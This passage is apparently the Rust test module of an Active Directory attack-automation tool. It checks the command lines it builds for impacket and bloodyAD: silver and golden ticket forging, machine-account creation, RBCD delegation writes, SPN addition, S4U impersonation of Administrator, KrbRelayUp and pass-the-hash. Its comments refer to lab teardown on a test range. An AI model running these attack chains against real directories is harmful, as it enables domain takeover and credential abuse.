    fn silver_ticket_rejects_an_spn_without_a_service_class() {
        for bad in ["sql01.contoso.local", "cifs", ""] {
            let args = with_arg(&silver_ticket_base(), "spn", bad);
            assert!(
                super::build_silver_ticket_command(&args).is_err(),
                "spn {bad:?} must be refused"
            );
        }
    }

    #[test]
    fn silver_ticket_requires_the_domain_sid() {
        let mut args = silver_ticket_base();
        args.as_object_mut().unwrap().remove("domain_sid");
        assert!(super::build_silver_ticket_command(&args).is_err());
    }

    #[test]
    fn silver_ticket_requires_the_signing_account_username() {
        let mut args = silver_ticket_base();
        args.as_object_mut().unwrap().remove("username");
        assert!(super::build_silver_ticket_command(&args).is_err());
    }

    /// impacket-addcomputer exits 0 on a refused delete, so the exit code
    /// alone reports a machine account as removed while it is still in the
    /// directory. Observed live on three noPac accounts.
    #[test]
    fn add_computer_refusal_is_detected_despite_exit_zero() {
        let refused = "Impacket v0.13.0\n\n[-] User alice doesn't have right to delete WS01$!";
        assert!(super::add_computer_refused(refused));
        assert!(super::add_computer_refused(
            "[-] Unable to delete machine account"
        ));
    }

    /// The add side exits 0 on refusal too. `already exists` is the one that
    /// matters: the name collides with an object this operation did not create,
    /// and journaling it as a creation points teardown's delete at that object.
    #[test]
    fn add_computer_add_side_refusals_are_detected_despite_exit_zero() {
        for refused in [
            "[-] Account WS01$ already exists! If you just want to set a password, use -no-add.",
            "[-] User alice machine quota exceeded!",
            "[-] Failed to add a new computer. The server denied the operation.",
            "[-] Failed to add a new computer. The server requires a stronger authentication.",
            "[-] Account WS01$ not found in DC=contoso,DC=local!",
            "[-] SMB SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied}",
        ] {
            assert!(super::add_computer_refused(refused), "{refused}");
        }
    }

    #[test]
    fn add_computer_success_is_not_flagged_as_refused() {
        assert!(!super::add_computer_refused(
            "[*] Successfully deleted WIN-ABCDEF12$."
        ));
        assert!(!super::add_computer_refused(
            "[*] Successfully added machine account"
        ));
    }

    #[test]
    fn add_computer_all_required_args() {
        let args = json!({
            "domain": "contoso.local",
            "username": "alice",
            "password": "P@ssw0rd!",
            "computer_name": "svc_rbcd$",
            "computer_password": "CompP@ss123!",
            "dc_ip": "192.168.58.10"
        });
        let cmd = super::build_add_computer(&args).unwrap();
        let argv = cmd.args_for_test();
        assert!(argv.iter().any(|a| a == "contoso.local/alice:P@ssw0rd!"));
        assert_eq!(flag_value(argv, "-computer-name"), Some("svc_rbcd$"));
        assert_eq!(flag_value(argv, "-computer-pass"), Some("CompP@ss123!"));
        assert_eq!(flag_value(argv, "-dc-ip"), Some("192.168.58.10"));
    }

    #[test]
    fn add_computer_missing_computer_name() {
        let args = json!({
            "domain": "contoso.local",
            "username": "jsmith",
            "password": "P@ssw0rd!",
            "computer_password": "CompP@ss123!",
            "dc_ip": "192.168.58.10"
        });
        assert!(required_str(&args, "computer_name").is_err());
    }

    #[test]
    fn addspn_all_required_args() {
        let args = json!({
            "domain": "contoso.local",
            "username": "admin",
            "password": "P@ssw0rd!",
            "dc_ip": "192.168.58.10",
            "action": "add",
            "target_account": "svc_sql",
            "spn": "MSSQLSvc/sql01.contoso.local:1433"
        });
        let cmd = super::build_addspn(&args).unwrap();
        let argv = cmd.args_for_test();
        assert_eq!(flag_value(argv, "-p"), Some("P@ssw0rd!"));
        assert_eq!(flag_value(argv, "--host"), Some("192.168.58.10"));
        assert!(argv.iter().any(|a| a == "add"));
        assert!(argv.iter().any(|a| a == "spn"));
        assert!(argv.iter().any(|a| a == "svc_sql"));
        assert!(argv
            .iter()
            .any(|a| a == "MSSQLSvc/sql01.contoso.local:1433"));
    }

    #[test]
    fn addspn_missing_spn() {
        let args = json!({
            "domain": "contoso.local",
            "username": "admin",
            "password": "P@ssw0rd!",
            "dc_ip": "192.168.58.10",
            "action": "add",
            "target_account": "svc_sql"
        });
        assert!(required_str(&args, "spn").is_err());
    }

    #[test]
    fn rbcd_write_all_args() {
        let args = json!({
            "domain": "contoso.local",
            "username": "admin",
            "password": "P@ssw0rd!",
            "target_computer": "dc01$",
            "attacker_account": "EVILPC$",
            "attacker_sid": "S-1-5-21-1234567890-987654321-1122334455-1234",
            "dc_ip": "192.168.58.10"
        });
        let cmd = super::build_rbcd_write(&args).unwrap();
        let argv = cmd.args_for_test();
        assert!(argv.iter().any(|a| a == "contoso.local/admin:P@ssw0rd!"));
        assert_eq!(flag_value(argv, "-delegate-to"), Some("dc01$"));
        assert_eq!(flag_value(argv, "-delegate-from"), Some("EVILPC$"));
        assert_eq!(flag_value(argv, "-action"), Some("write"));
    }

    /// Teardown inverts an RBCD write by overriding `action` to `remove`. The
    /// builder previously hardcoded `-action write` and ignored the override,
    /// so every "revert" re-applied the mutation it claimed to undo, exited 0,
    /// and was recorded as reverted.
    #[test]
    fn rbcd_write_honours_the_action_override() {
        let args = with_arg(
            &with_arg(&rbcd_write_base(), "hash", NT),
            "action",
            "remove",
        );
        let cmd = super::build_rbcd_write(&args).unwrap();
        assert_eq!(flag_value(cmd.args_for_test(), "-action"), Some("remove"));
    }

    #[test]
    fn rbcd_write_defaults_to_write_when_no_action_is_given() {
        let args = with_arg(&rbcd_write_base(), "hash", NT);
        let cmd = super::build_rbcd_write(&args).unwrap();
        assert_eq!(flag_value(cmd.args_for_test(), "-action"), Some("write"));
    }

    /// `flush` wipes the whole attribute, including delegation entries the
    /// range provisioned. Teardown must never be able to reach it by passing an
    /// action through, so unknown actions fail loudly instead of falling back.
    #[test]
    fn rbcd_write_refuses_flush_and_other_actions() {
        for action in ["flush", "read", "nonsense"] {
            let args = with_arg(&with_arg(&rbcd_write_base(), "hash", NT), "action", action);
            assert!(
                super::build_rbcd_write(&args).is_err(),
                "action '{action}' must be refused"
            );
        }
    }

    /// The SID belongs to teardown's read-back needle, never to impacket.
    /// rbcd.py resolves `-delegate-from` with `(sAMAccountName=%s)`, so a SID
    /// there matches nothing, `write()` returns early, and the process still
    /// exits 0 — a silent no-op that teardown would then "revert".
    #[test]
    fn rbcd_write_rejects_a_sid_as_delegate_from() {
        let args = json!({
            "domain": "contoso.local",
            "username": "admin",
            "password": "P@ssw0rd!",
            "target_computer": "dc01$",
            "attacker_account": "S-1-5-21-1234567890-987654321-1122334455-1234",
            "dc_ip": "192.168.58.10"
        });
        let err = match super::build_rbcd_write(&args) {
            Ok(_) => panic!("a SID must be rejected as -delegate-from"),
            Err(e) => e.to_string(),
        };
        assert!(
            err.contains("sAMAccountName"),
            "error should point at the account-name requirement, got: {err}"
        );
    }

    /// A SID alone is not enough to build the command: it cannot stand in for
    /// the account name.
    #[test]
    fn rbcd_write_requires_attacker_account_not_just_sid() {
        let args = json!({
            "domain": "contoso.local",
            "username": "admin",
            "password": "P@ssw0rd!",
            "target_computer": "dc01$",
            "attacker_sid": "S-1-5-21-1234567890-987654321-1122334455-1234",
            "dc_ip": "192.168.58.10"
        });
        assert!(super::build_rbcd_write(&args).is_err());
    }

    #[test]
    fn rbcd_write_missing_attacker_account() {
        let args = json!({
            "domain": "contoso.local",
            "username": "admin",
            "password": "P@ssw0rd!",
            "target_computer": "dc01$",
            "dc_ip": "192.168.58.10"
        });
        assert!(super::build_rbcd_write(&args).is_err());
    }

    #[test]
    fn looks_like_sid_discriminates_sids_from_account_names() {
        assert!(super::looks_like_sid("S-1-5-21-1-2-3-1105"));
        assert!(super::looks_like_sid("s-1-5-21-1-2-3-1105"));
        assert!(!super::looks_like_sid("EVILPC$"));
        assert!(!super::looks_like_sid("SQL-SRV-01$"));
    }

    #[test]
    fn krbrelayup_required_args_only() {
        let args = json!({
            "domain": "contoso.local",
            "dc_ip": "192.168.58.10"
        });
        assert_eq!(required_str(&args, "domain").unwrap(), "contoso.local");
        assert_eq!(required_str(&args, "dc_ip").unwrap(), "192.168.58.10");
        assert!(optional_str(&args, "method").is_none());
        assert!(optional_str(&args, "create_user").is_none());
        assert!(optional_str(&args, "create_password").is_none());
    }

    #[test]
    fn krbrelayup_with_optional_args() {
        let args = json!({
            "domain": "contoso.local",
            "dc_ip": "192.168.58.10",
            "method": "rbcd",
            "create_user": "eviluser",
            "create_password": "Ev1lP@ss!"
        });
        assert_eq!(optional_str(&args, "method"), Some("rbcd"));
        assert_eq!(optional_str(&args, "create_user"), Some("eviluser"));
    }

    #[test]
    fn hash_args_with_nt_only() {
        let hash_args = credentials::hash_args("31d6cfe0d16ae931b73c59d7e0c089c0");
        assert_eq!(hash_args[0], "-hashes");
        assert_eq!(hash_args[1], ":31d6cfe0d16ae931b73c59d7e0c089c0");
    }

    #[test]
    fn hash_args_with_lm_nt() {
        let hash_args = credentials::hash_args(
            "aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0",
        );
        assert_eq!(hash_args[0], "-hashes");
        assert_eq!(
            hash_args[1],
            "aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0"
        );
    }

    #[test]
    fn impacket_auth_with_hash() {
        let (target, extra) = credentials::impacket_auth(
            Some("contoso.local"),
            "admin",
            None,
            Some("31d6cfe0d16ae931b73c59d7e0c089c0"),
            "192.168.58.10",
        );
        assert_eq!(target, "contoso.local/admin@192.168.58.10");
        assert_eq!(extra, vec!["-hashes", ":31d6cfe0d16ae931b73c59d7e0c089c0"]);
    }

    #[test]
    fn impacket_auth_with_password() {
        let (target, extra) = credentials::impacket_auth(
            Some("contoso.local"),
            "admin",
            Some("P@ssw0rd!"),
            None,
            "192.168.58.10",
        );
        assert_eq!(target, "contoso.local/admin:P@ssw0rd!@192.168.58.10");
        assert!(extra.is_empty());
    }

    #[test]
    fn kerberos_env() {
        let (key, val) = credentials::kerberos_env("/tmp/admin.ccache");
        assert_eq!(key, "KRB5CCNAME");
        assert_eq!(val, "/tmp/admin.ccache");
    }

    // --- mock executor tests ---

    use super::*;
    use crate::executor::mock;

    #[tokio::test]
    async fn find_delegation_with_password_executes() {
        mock::push(mock::success());
        let args = json!({
            "domain": "contoso.local",
            "username": "admin",
            "password": "P@ssw0rd!",
            "dc_ip": "192.168.58.10"
        });
        assert!(find_delegation(&args).await.is_ok());
    }

    #[tokio::test]
    async fn find_delegation_with_hash_executes() {
        mock::push(mock::success());
        let args = json!({
            "domain": "contoso.local",
            "username": "admin",
            "hash": "aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0",
            "dc_ip": "192.168.58.10"
        });
        assert!(find_delegation(&args).await.is_ok());
    }

    #[tokio::test]
    async fn s4u_attack_with_password_executes() {
        mock::push(mock::success());
        let args = json!({
            "domain": "contoso.local",
            "username": "svc_web$",
            "password": "P@ssw0rd!",
            "target_spn": "cifs/dc01.contoso.local",
            "impersonate": "Administrator"
        });
        assert!(s4u_attack(&args).await.is_ok());
    }

    #[tokio::test]
    async fn s4u_attack_with_hash_and_dc_ip_executes() {
        mock::push(mock::success());
        let args = json!({
            "domain": "contoso.local",
            "username": "svc_web$",
            "hash": "31d6cfe0d16ae931b73c59d7e0c089c0",
            "target_spn": "cifs/dc01.contoso.local",
            "impersonate": "Administrator",
            "dc_ip": "192.168.58.10"
        });
        assert!(s4u_attack(&args).await.is_ok());
    }

    #[tokio::test]
    async fn generate_golden_ticket_executes() {
        mock::push(mock::success());
        let args = json!({
            "krbtgt_hash": "31d6cfe0d16ae931b73c59d7e0c089c0",
            "domain_sid": "S-1-5-21-1234567890-987654321-1122334455",
            "domain": "contoso.local"
        });
        assert!(generate_golden_ticket(&args).await.is_ok());
    }

    #[tokio::test]
    async fn generate_golden_ticket_with_extra_sid_executes() {
        mock::push(mock::success());
        let args = json!({
            "krbtgt_hash": "31d6cfe0d16ae931b73c59d7e0c089c0",
            "domain_sid": "S-1-5-21-1234567890-987654321-1122334455",
            "domain": "contoso.local",
            "extra_sid": "S-1-5-21-0000000000-000000000-000000000-519",
            "username": "fakeadmin"
        });
        assert!(generate_golden_ticket(&args).await.is_ok());
    }

    #[tokio::test]
    async fn generate_silver_ticket_executes() {
        mock::push(mock::success());
        let args = silver_ticket_base();
        assert!(generate_silver_ticket(&args).await.is_ok());
    }

    #[tokio::test]
    async fn add_computer_executes() {
        mock::push(mock::success());
        let args = json!({
            "domain": "contoso.local",
            "username": "jsmith",
            "password": "P@ssw0rd!",
            "computer_name": "EVIL$",
            "computer_password": "CompP@ss123!",
            "dc_ip": "192.168.58.10"
        });
        assert!(add_computer(&args).await.is_ok());
    }

    #[tokio::test]
    async fn addspn_executes() {
        mock::push(mock::success());
        let args = json!({
            "domain": "contoso.local",
            "username": "admin",
            "password": "P@ssw0rd!",
            "dc_ip": "192.168.58.10",
            "action": "add",
            "target_account": "svc_sql",
            "spn": "MSSQLSvc/sql01.contoso.local:1433"
        });
        assert!(addspn(&args).await.is_ok());
    }

    #[tokio::test]
    async fn rbcd_write_executes() {
        mock::push(mock::success());
        let args = json!({
            "domain": "contoso.local",
            "username": "admin",
            "password": "P@ssw0rd!",
            "target_computer": "dc01$",
            "attacker_account": "EVILPC$",
            "attacker_sid": "S-1-5-21-1234567890-987654321-1122334455-1234",
            "dc_ip": "192.168.58.10"
        });
        assert!(rbcd_write(&args).await.is_ok());
    }

    #[tokio::test]
    async fn krbrelayup_executes() {
        mock::push(mock::success());
        let args = json!({
            "domain": "contoso.local",
            "dc_ip": "192.168.58.10"
        });
        assert!(krbrelayup(&args).await.is_ok());
    }

    #[tokio::test]
    async fn krbrelayup_with_options_executes() {
        mock::push(mock::success());
        let args = json!({
            "domain": "contoso.local",
            "dc_ip": "192.168.58.10",
            "method": "rbcd",
            "create_user": "eviluser",
            "create_password": "Ev1lP@ss!"
        });
        assert!(krbrelayup(&args).await.is_ok());
    }

    // ── hash / ticket auth for the GenericAll→RBCD chain ────────────────

    const NT: &str = "0123456789abcdef0123456789abcdef";
    const LM: &str = "fedcba9876543210fedcba9876543210";
    const EMPTY_LM: &str = "aad3b435b51404eeaad3b435b51404ee";
    const CCACHE: &str = "/tmp/ares-tickets/alice.ccache";

    /// Value that follows `flag` in the built argv, if present.
    fn flag_value<'a>(argv: &'a [String], flag: &str) -> Option<&'a str> {
        let idx = argv.iter().position(|a| a == flag)?;
        argv.get(idx + 1).map(String::as_str)
    }

    fn with_arg(base: &Value, key: &str, value: &str) -> Value {
        let mut args = base.clone();
        args.as_object_mut()
            .unwrap()
            .insert(key.to_string(), Value::String(value.to_string()));
        args
    }

    fn add_computer_base() -> Value {
        json!({
            "domain": "contoso.local",
            "username": "alice",
            "computer_name": "svc_rbcd$",
            "computer_password": "CompP@ss123!",
            "dc_ip": "192.168.58.10"
        })
    }

    fn rbcd_write_base() -> Value {
        json!({
            "domain": "contoso.local",
            "username": "alice",
            "target_computer": "dc01$",
            "attacker_account": "EVILPC$",
            "attacker_sid": "S-1-5-21-1234567890-987654321-1122334455-1234",
            "dc_ip": "192.168.58.10"
        })
    }

    fn addspn_base() -> Value {
        json!({
            "domain": "contoso.local",
            "username": "alice",
            "dc_ip": "192.168.58.10",
            "action": "add",
            "target_account": "svc_sql",
            "spn": "MSSQLSvc/sql01.contoso.local:1433"
        })
    }

    type Builder = fn(&Value) -> Result<CommandBuilder>;

    /// The impacket-backed chain steps, whose identity string is a bare
    /// `domain/username[:password]` with no `@host` suffix.
    fn impacket_chain_cases() -> Vec<(&'static str, Value, Builder)> {
        vec![
            (
                "add_computer",
                with_arg(&add_computer_base(), "dc_host", "dc01.contoso.local"),
                super::build_add_computer as Builder,
            ),
            (
                "rbcd_write",
                rbcd_write_base(),
                super::build_rbcd_write as Builder,
            ),
        ]
    }

    /// Every step of the GenericAll→RBCD chain, impacket- and bloodyAD-backed.
    fn chain_cases() -> Vec<(&'static str, Value, Builder)> {
        let mut cases = impacket_chain_cases();
        cases.push(("addspn", addspn_base(), super::build_addspn as Builder));
        cases
    }

    #[test]
    fn chain_accepts_hash_only_auth() {
        for (name, base, build) in chain_cases() {
            let cmd = build(&with_arg(&base, "hash", NT))
                .unwrap_or_else(|e| panic!("{name} must build from a hash alone: {e}"));
            let argv = cmd.args_for_test();
            assert!(
                argv.iter().any(|a| a.contains(&format!("{EMPTY_LM}:{NT}"))),
                "{name} must carry the normalized LM:NT pair: {argv:?}"
            );
        }
    }

    #[test]
    fn chain_accepts_ticket_only_auth() {
        for (name, base, build) in chain_cases() {
            let cmd = build(&with_arg(&base, "ticket_path", CCACHE))
                .unwrap_or_else(|e| panic!("{name} must build from a ccache alone: {e}"));
            assert!(
                cmd.args_for_test().iter().any(|a| a == "-k"),
                "{name} must select the Kerberos branch"
            );
            assert!(
                cmd.env_vars_for_test()
                    .iter()
                    .any(|(k, v)| k == "KRB5CCNAME" && v == CCACHE),
                "{name} must export KRB5CCNAME"
            );
        }
    }

    #[test]
    fn chain_accepts_password_only_auth() {
        for (name, base, build) in chain_cases() {
            let cmd = build(&with_arg(&base, "password", "P@ssw0rd!"))
                .unwrap_or_else(|e| panic!("{name} must build from a password alone: {e}"));
            let argv = cmd.args_for_test();
            assert!(argv.iter().all(|a| a != "-k"), "{name}");
            assert!(argv.iter().all(|a| a != "-hashes"), "{name}");
        }
    }

    #[test]
    fn chain_without_auth_material_errors_naming_every_form() {
        for (name, base, build) in chain_cases() {
            let Err(err) = build(&base) else {
                panic!("{name} must refuse to dispatch without any auth material");
            };
            let err = err.to_string();
            for form in ["ticket_path", "hash", "nt_hash", "ntlm_hash", "password"] {
                assert!(
                    err.contains(form),
                    "{name} error must name the `{form}` auth form; got: {err}"
                );
            }
        }
    }

    #[test]
    fn impacket_chain_identity_carries_no_password_under_hash_or_ticket() {
        for (name, base, build) in impacket_chain_cases() {
            for key in ["hash", "ticket_path"] {
                let value = if key == "hash" { NT } else { CCACHE };
                let args = with_arg(&with_arg(&base, key, value), "password", "P@ssw0rd!");
                let cmd = build(&args).unwrap();
                let argv = cmd.args_for_test();
                assert!(
                    argv.iter().any(|a| a == "contoso.local/alice"),
                    "{name} ({key}) must send the bare domain/user identity: {argv:?}"
                );
                assert!(
                    argv.iter().all(|a| !a.contains("P@ssw0rd!")),
                    "{name} ({key}) leaked the password into the argv: {argv:?}"
                );
                assert!(argv.iter().any(|a| a == "-no-pass"), "{name} ({key})");
            }
        }
    }

    #[test]
    fn impacket_chain_password_identity_has_the_password_suffix() {
        for (name, base, build) in impacket_chain_cases() {
            let cmd = build(&with_arg(&base, "password", "P@ssw0rd!")).unwrap();
            assert!(
                cmd.args_for_test()
                    .iter()
                    .any(|a| a == "contoso.local/alice:P@ssw0rd!"),
                "{name} must fold the password into the identity string"
            );
        }
    }

    #[test]
    fn impacket_chain_hash_normalization() {
        let expected_empty_lm = format!("{EMPTY_LM}:{NT}");
        let cases: Vec<(&str, String, String)> = vec![
            ("hash", NT.to_string(), expected_empty_lm.clone()),
            ("hash", format!("{LM}:{NT}"), format!("{LM}:{NT}")),
            ("hash", format!(":{NT}"), expected_empty_lm.clone()),
            ("hash", format!("  {NT}  "), expected_empty_lm.clone()),
            ("nt_hash", NT.to_string(), expected_empty_lm.clone()),
            ("ntlm_hash", NT.to_string(), expected_empty_lm),
        ];
        for (name, base, build) in impacket_chain_cases() {
            for (key, raw, expected) in &cases {
                let cmd = build(&with_arg(&base, key, raw)).unwrap();
                assert_eq!(
                    flag_value(cmd.args_for_test(), "-hashes"),
                    Some(expected.as_str()),
                    "{name}: {key}={raw} must reach impacket as -hashes LMHASH:NTHASH"
                );
            }
        }
    }

    #[test]
    fn chain_rejects_malformed_hash() {
        for (name, base, build) in chain_cases() {
            for raw in [
                "not-a-hash",
                "0123456789abcdef",
                "0123456789abcdef0123456789abcde",
                "0123456789abcdef0123456789abcdefa",
                "zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz",
                "nolm:0123456789abcdef0123456789abcde",
                "0123456789abcdef0123456789abcdef:short",
            ] {
                let Err(err) = build(&with_arg(&base, "hash", raw)) else {
                    panic!("{name}: malformed hash {raw:?} must not reach the subprocess");
                };
                assert!(
                    err.to_string().contains("malformed NTLM hash"),
                    "{name}: expected a malformed-hash error for {raw:?}, got: {err}"
                );
            }
        }
    }

    #[test]
    fn chain_auth_precedence_is_ticket_then_hash_then_password() {
        for (name, base, build) in chain_cases() {
            let all_three = with_arg(
                &with_arg(&with_arg(&base, "password", "P@ssw0rd!"), "hash", NT),
                "ticket_path",
                CCACHE,
            );
            let cmd = build(&all_three).unwrap();
            assert!(
                cmd.args_for_test().iter().all(|a| a != "-hashes"),
                "{name}: ticket_path must suppress the hash branch"
            );
            assert!(
                cmd.env_vars_for_test()
                    .iter()
                    .any(|(k, _)| k == "KRB5CCNAME"),
                "{name}: ticket_path must win"
            );

            let hash_and_password = with_arg(&with_arg(&base, "hash", NT), "password", "P@ssw0rd!");
            let cmd = build(&hash_and_password).unwrap();
            assert!(
                cmd.args_for_test().iter().all(|a| !a.contains("P@ssw0rd!")),
                "{name}: hash must win over password"
            );
        }
    }

    #[test]
    fn chain_empty_hash_falls_back_to_password() {
        for (name, base, build) in chain_cases() {
            let args = with_arg(&with_arg(&base, "hash", ""), "password", "P@ssw0rd!");
            let cmd = build(&args)
                .unwrap_or_else(|e| panic!("{name} must fall through an empty hash: {e}"));
            assert!(
                cmd.args_for_test().iter().all(|a| a != "-hashes"),
                "{name}: an empty hash must not select the pass-the-hash branch"
            );
        }
    }

    #[test]
    fn add_computer_kerberos_requires_dc_host() {
        let args = with_arg(&add_computer_base(), "ticket_path", CCACHE);
        let Err(err) = super::build_add_computer(&args) else {
            panic!("addcomputer.py rejects -k without -dc-host; the wrapper must too");
        };
        assert!(err.to_string().contains("dc_host"), "{err}");

        let args = with_arg(&args, "dc_host", "dc01.contoso.local");
        let cmd = super::build_add_computer(&args).unwrap();
        assert_eq!(
            flag_value(cmd.args_for_test(), "-dc-host"),
            Some("dc01.contoso.local")
        );
    }

    #[test]
    fn add_computer_delete_action_keeps_hash_auth() {
        let args = with_arg(
            &with_arg(&add_computer_base(), "hash", NT),
            "action",
            "delete",
        );
        let cmd = super::build_add_computer(&args).unwrap();
        let argv = cmd.args_for_test();
        assert!(argv.iter().any(|a| a == "-delete"));
        assert!(argv.iter().all(|a| a != "-computer-pass"));
        assert_eq!(
            flag_value(argv, "-hashes"),
            Some(format!("{EMPTY_LM}:{NT}").as_str())
        );
    }

    #[test]
    fn add_computer_delete_action_needs_no_computer_password() {
        let mut args = add_computer_base();
        args.as_object_mut().unwrap().remove("computer_password");
        let args = with_arg(
            &with_arg(&args, "password", "P@ssw0rd!"),
            "action",
            "delete",
        );
        assert!(super::build_add_computer(&args).is_ok());
    }

    #[test]
    fn addspn_hash_auth_uses_bloodyad_password_flag() {
        let cmd = super::build_addspn(&with_arg(&addspn_base(), "hash", NT)).unwrap();
        let argv = cmd.args_for_test();
        assert_eq!(
            flag_value(argv, "-p"),
            Some(format!("{EMPTY_LM}:{NT}").as_str())
        );
        assert_eq!(flag_value(argv, "-u"), Some("alice"));
        assert_eq!(flag_value(argv, "-d"), Some("contoso.local"));
    }

    #[test]
    fn addspn_ticket_auth_uses_ccache_keyword_form() {
        let cmd = super::build_addspn(&with_arg(&addspn_base(), "ticket_path", CCACHE)).unwrap();
        let argv = cmd.args_for_test();
        assert!(argv.iter().any(|a| *a == format!("ccache={CCACHE}")));
        assert!(
            argv.iter().all(|a| a != "-p"),
            "ticket_path must suppress both -p forms: {argv:?}"
        );
    }

    #[test]
    fn rbcd_write_passes_dc_host_when_supplied() {
        let args = with_arg(
            &with_arg(&rbcd_write_base(), "hash", NT),
            "dc_host",
            "dc01.contoso.local",
        );
        let cmd = super::build_rbcd_write(&args).unwrap();
        assert_eq!(
            flag_value(cmd.args_for_test(), "-dc-host"),
            Some("dc01.contoso.local")
        );
    }

    #[tokio::test]
    async fn add_computer_with_hash_executes() {
        mock::push(mock::success());
        let args = with_arg(&add_computer_base(), "hash", NT);
        assert!(add_computer(&args).await.is_ok());
    }

    #[tokio::test]
    async fn rbcd_write_with_hash_executes() {
        mock::push(mock::success());
        let args = with_arg(&rbcd_write_base(), "hash", NT);
        assert!(rbcd_write(&args).await.is_ok());
    }

    #[tokio::test]
    async fn addspn_with_hash_executes() {
        mock::push(mock::success());
        let args = with_arg(&addspn_base(), "hash", NT);
        assert!(addspn(&args).await.is_ok());
    }
}
